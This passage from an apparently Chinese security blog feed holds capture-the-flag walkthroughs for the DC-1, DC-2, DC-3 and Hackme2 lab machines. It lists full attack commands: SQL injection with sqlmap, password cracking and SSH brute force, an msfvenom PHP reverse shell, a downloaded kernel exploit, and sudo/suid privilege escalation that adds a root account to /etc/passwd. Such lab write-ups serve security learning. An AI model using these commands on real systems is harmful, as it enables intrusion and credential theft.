src="https://img.rruu.net/image/603815ae30577" alt="image-20201229134500673"></p><p>msf设置监听会话</p><p><img src="https://img.rruu.net/image/603815b4662d7" alt="image-20201229134621483"></p><p>使用php运行shell.php</p><p><img src="https://img.rruu.net/image/603815bc1cfb7" alt="image-20201229134641614"></p><p>成功回弹shell</p><p><img src="https://img.rruu.net/image/603815c378928" alt="image-20201229134659936"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815c9e0273" alt="image-20201229134807967"></p><p>收集用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815cfe3826" alt="image-20201229135046429"></p><h3 id="使用hydra爆破ssh"><a href="#使用hydra爆破ssh" class="headerlink" title="使用hydra爆破ssh"></a>使用hydra爆破ssh</h3><p>保存用户名到txt</p><p><img src="https://img.rruu.net/image/603815d63a95b" alt="image-20201229135227404"></p><p>发现密码备份文件，回传到本地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home&#x2F;jim&#x2F;backups</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815dca8dc8" alt="image-20201229135846253"></p><p>开始爆破，耐心等待结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P old-passwords.bak 192.168.56.130 ssh -t 32</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815e5a4cba" alt="image-20201229140324447"></p><p>使用jim进行ssh登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.56.130</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815ed58fdd" alt="image-20201229140446749"></p><p>查看mbox文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f3c985a" alt="image-20201229140508894"></p><p>查看mail文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;var&#x2F;mail</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815f969aa5" alt="image-20201229140759660"></p><p>读取邮件，发现charles用户密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat jim</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815ff0473c" alt="image-20201229140824975"></p><p>su切换用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816047c3dc" alt="image-20201229140851469"></p><h3 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h3><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038160959869" alt="image-20201229140935229"></p><p>查看使用说明，发现是一个类似于复制文件的功能的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo teehee --help</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038160e3c417" alt="image-20201229141123823"></p><p>切回kali，生成passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816137e7e3" alt="image-20201229141354476"></p><p>追加passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;magisec:$1$magisec$921bybGVs5PblAXFXFeC&#x2F;&#x2F;:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; | sudo teehee -a &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038161853e32" alt="image-20201229141422380"></p><p>查看passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038161da50a1" alt="image-20201229141442254"></p><p>切换magisec用户，完成提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381623562da" alt="image-20201229141507850"></p><p>获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603816288c738" alt="image-20201229141529179"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="2021/01/01/DC-3/"/>
      <url>2021/01/01/DC-3/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.128</p><p>修改一下hosts如下：</p><p><img src="https://img.rruu.net/image/6038155a9cbde" alt="image-20201228130559022"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-3 192.168.56.129</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038155f9bdf0" alt="image-20201228130630080"></p><p>开放 80</p><p>80 web joomla</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;dc-3&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815651df3e" alt="image-20201228130726082"></p><h3 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http:&#x2F;&#x2F;dc-3&#x2F; -e php --full-url</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038156aba60a" alt="image-20201228131050579"></p><p>发现后台/administrator</p><h3 id="使用joomscan检测web"><a href="#使用joomscan检测web" class="headerlink" title="使用joomscan检测web"></a>使用joomscan检测web</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http:&#x2F;&#x2F;dc-3&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815706b2fc" alt="image-20201228131233359"></p><p>获取到详细版本，我们这里没有检测到，我们搜索一下相关历史漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381575a7b55" alt="image-20201228131315935"></p><p>调用漏洞出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php&#x2F;webapps&#x2F;42033.txt -m</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038157b4ffb7" alt="image-20201228131410589"></p><h3 id="sqlmap检测与利用漏洞"><a href="#sqlmap检测与利用漏洞" class="headerlink" title="sqlmap检测与利用漏洞"></a>sqlmap检测与利用漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;dc-3&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381581c5e09" alt="image-20201228131544830"></p><h4 id="获取admin密码"><a href="#获取admin密码" class="headerlink" title="获取admin密码"></a>获取admin密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;dc-3&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -p list[fullordering] -D &quot;joomladb&quot; -T &quot;#__users&quot; --dump --hex</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381587e975d" alt="image-20201228133635936"></p><h3 id="hashcat破解密码"><a href="#hashcat破解密码" class="headerlink" title="hashcat破解密码"></a>hashcat破解密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 --force &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -o hash.txt -m 3200</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/6038158db28fe" alt="image-20201228133723121"></p><h3 id="登录后台模板文件getshell"><a href="#登录后台模板文件getshell" class="headerlink" title="登录后台模板文件getshell"></a>登录后台模板文件getshell</h3><p>msf生成php shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/60381594983c6" alt="image-20201228134639406"></p><p>写入php shell</p><p><img src="https://img.rruu.net/image/6038159b7d20f" alt="image-20201228134556338"></p><p>msf设置监听</p><p><img src="https://img.rruu.net/image/603815a10a7d6" alt="image-20201228134713868"></p><p>curl请求触发反弹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;dc-3&#x2F;templates&#x2F;protostar&#x2F;html&#x2F;1.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815a5e0929" alt="image-20201228134759500"></p><p>返回会话</p><p><img src="https://img.rruu.net/image/603815ac985d3" alt="image-20201228134925630"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b2c6880" alt="image-20201228135241660"></p><h3 id="ubuntu16-04本地权限提升漏洞"><a href="#ubuntu16-04本地权限提升漏洞" class="headerlink" title="ubuntu16.04本地权限提升漏洞"></a>ubuntu16.04本地权限提升漏洞</h3><p>查看linux版本信息内核版本4.4.0-21</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815b94f20b" alt="image-20201228135433402"></p><p>查看ubuntu详细版本，版本为16.04</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;lsb-release</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815bea7770" alt="image-20201228135726556"></p><p>搜索历史漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815c660a9c" alt="image-20201228142843133"></p><p>将这个文件下载到 <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a> 目标主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure><p>将文件解压，然后到这个目录，执行sh文件。</p><p><img src="https://img.rruu.net/image/603815cde7995" alt="image-20201228143742105"></p><p>即可获取root权限。</p><p><img src="https://img.rruu.net/image/603815d483a47" alt="image-20201228143806138"></p><p>获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;the-flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/603815dc38281" alt="image-20201228143840045"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="2020/12/30/DC-2/"/>
      <url>2020/12/30/DC-2/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.128</p><p>修改一下hosts如下：</p><p><img src="https://img.rruu.net/image/5febd14b95f22" alt="image-20201228093449722"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-2 192.168.56.128</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd153701ee" alt="image-20201228093122112"></p><p>开放端口：80 7744</p><p>80 web</p><p>7744 ssh</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开80站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dc-2&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd15972a5b" alt="image-20201228093513278"></p><h3 id="cmseek识别cms"><a href="#cmseek识别cms" class="headerlink" title="cmseek识别cms"></a>cmseek识别cms</h3><p>使用cmseek识别cms，确定cms为wordpress，且版本为4.7.10。发现三位用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmseek</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd16222de9" alt="image-20201228093657685"></p><h3 id="gobuster爆破目录"><a href="#gobuster爆破目录" class="headerlink" title="gobuster爆破目录"></a>gobuster爆破目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 50 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;dc-2 -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1672d815" alt="image-20201228093819155"></p><p>找到后台 wp-admin</p><h3 id="wpscan检测wordpress"><a href="#wpscan检测wordpress" class="headerlink" title="wpscan检测wordpress"></a>wpscan检测wordpress</h3><p>进行常规枚举，没有发现漏洞，只能发现用户名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd16cd8fd9" alt="image-20201228094059732"></p><p>尝试暴力破解用户名密码，尝试失败。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -U admin -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1735f27d" alt="image-20201228094556222"></p><p>使用cewl生成字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2 &gt; pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1791eb22" alt="image-20201228094644440"></p><p>再次尝试使用字典爆破，成功爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F;  -P .&#x2F;pass.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd17dbde16" alt="image-20201228094718264"></p><h3 id="wordpress后台getshell"><a href="#wordpress后台getshell" class="headerlink" title="wordpress后台getshell"></a>wordpress后台getshell</h3><p>尝试getshell失败，后台没有任何插件，用户权限太低。</p><h2 id="7744-ssh端口渗透"><a href="#7744-ssh端口渗透" class="headerlink" title="7744 ssh端口渗透"></a>7744 ssh端口渗透</h2><p>hydra暴力破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L .&#x2F;user.txt -P .&#x2F;pass.txt 192.168.56.128 ssh -s 7744</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1830b605" alt="image-20201228095630140"></p><p>使用tom登录系统，发现有rbash限制。我们尝试逃逸rbash限制。关于rbash逃逸的资料，<a href="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/">https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.128 -p 7744</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd18900517" alt="image-20201228100038207"></p><p>使用ssh登录逃逸，逃逸失败。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.128 -p 7744 -t &quot;bash -noprofile&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd18e5bedd" alt="image-20201228100100919"></p><p>vi逃逸，成功逃逸。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd19398e50" alt="image-20201228100803175"></p><p>发现没有很多命令，我们查看一下环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd199e4147" alt="image-20201228101229078"></p><p>添加一下环境变量</p><p><img src="https://img.rruu.net/image/5febd19e543af" alt="image-20201228101327945"></p><p>成功添加，这里提示我们su切换用户，我们尝试切换jerry用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1a50ca19" alt="image-20201228101415654"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>查看sudo配置，发现git不需要passwd，且是root权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1aa0e8c2" alt="image-20201228101709351"></p><h3 id="git-sudo提权"><a href="#git-sudo提权" class="headerlink" title="git sudo提权"></a>git sudo提权</h3><p>使用git suid提权，先执行第一行命令，然后执行第二行，获得root权限的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1b00dd1a" alt="image-20201228101933639"></p><p><img src="https://img.rruu.net/image/5febd1b59a00a" alt="image-20201228102016209"></p><h3 id="获取flag-txt"><a href="#获取flag-txt" class="headerlink" title="获取flag.txt"></a>获取flag.txt</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;final-flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1ba5cb6f" alt="image-20201228102126920"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="2020/12/30/DC-1/"/>
      <url>2020/12/30/DC-1/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.127</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA DC-1 192.168.56.127</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd1418ce3f" alt="image-20201227204111900"></p><p>开放端口：22 80 111 50742</p><p>22 ssh</p><p>80 web</p><p>111 rpcbind</p><p>50742 rpc</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.127</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd14768c0e" alt="image-20201227204704906"></p><h3 id="whatweb识别cms"><a href="#whatweb识别cms" class="headerlink" title="whatweb识别cms"></a>whatweb识别cms</h3><p>发现是drupal，经验告诉我这个站可以直接用msfgetshell回来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:&#x2F;&#x2F;192.168.56.127&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd14d06a97" alt="image-20201227204652909"></p><h3 id="msf利用drupal漏洞"><a href="#msf利用drupal漏洞" class="headerlink" title="msf利用drupal漏洞"></a>msf利用drupal漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd152c3e98" alt="image-20201227205208904"></p><p>设置一下msf</p><p><img src="https://img.rruu.net/image/5febd159d402b" alt="image-20201227205229207"></p><p>直接run返回会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd160eaaf2" alt="image-20201227205317319"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="收集主机信息"><a href="#收集主机信息" class="headerlink" title="收集主机信息"></a>收集主机信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sites\default\settings.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd166ae061" alt="image-20201227205703482"></p><h3 id="suid-find提权"><a href="#suid-find提权" class="headerlink" title="suid find提权"></a>suid find提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd16c7aaee" alt="image-20201227210424566"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5febd17498855" alt="image-20201227210445706"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hackme2</title>
      <link href="2020/12/29/Hackme2/"/>
      <url>2020/12/29/Hackme2/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.132.140</p><p>靶机IP：192.168.132.139</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap探测端口"><a href="#Nmap探测端口" class="headerlink" title="Nmap探测端口"></a>Nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -p- 192.168.132.139 -oN hackme2.nmap</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa83a32c43" alt="image-20201225095131102"></p><p>开放端口：22 80</p><p>系统： ubuntu</p><p>22 ssh</p><p>80 web</p><p>渗透思路：80端口getshell</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开网站查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.132.139&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa840638f9" alt="image-20201225095436788"></p><p>先注册一个用户</p><p><img src="https://img.rruu.net/image/5feaa844ceb3e" alt="image-20201225095446968"></p><p>输入密码登录页面</p><p><img src="https://img.rruu.net/image/5feaa84a1eefa" alt="image-20201225095614724"></p><p>我们打开burpsuite测试，抓包输入框，手工查找注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.132.139&#x2F;welcome.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa84f48cf7" alt="image-20201225095904120"></p><h3 id="手工挖掘SQL注入"><a href="#手工挖掘SQL注入" class="headerlink" title="手工挖掘SQL注入"></a>手工挖掘SQL注入</h3><p>使用burpsuite抓包，action到repeater模块，进行重放测试。经过测试我们可以使用/**/干扰他的正则判断，所以我们使用sqlmap自带的脚本，space2comment.py</p><p><img src="https://img.rruu.net/image/5feaa85462077" alt="image-20201225120006529"></p><p>返回错误</p><p><img src="https://img.rruu.net/image/5feaa85a73caa" alt="image-20201225120029971"></p><h3 id="SQLmap检测SQL注入漏洞"><a href="#SQLmap检测SQL注入漏洞" class="headerlink" title="SQLmap检测SQL注入漏洞"></a>SQLmap检测SQL注入漏洞</h3><p>使用sqlmap检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --tamper&#x3D;space2comment.py  --prefix&#x3D;&quot;%&#39;&quot; --suffix&#x3D;&quot;%23&quot; -p search</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa85f443b1" alt="image-20201225120118689"></p><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --tamper&#x3D;space2comment.py  --prefix&#x3D;&quot;%&#39;&quot; --suffix&#x3D;&quot;%23&quot; -p search --dbs</span><br></pre></td></tr></table></figure><p><img 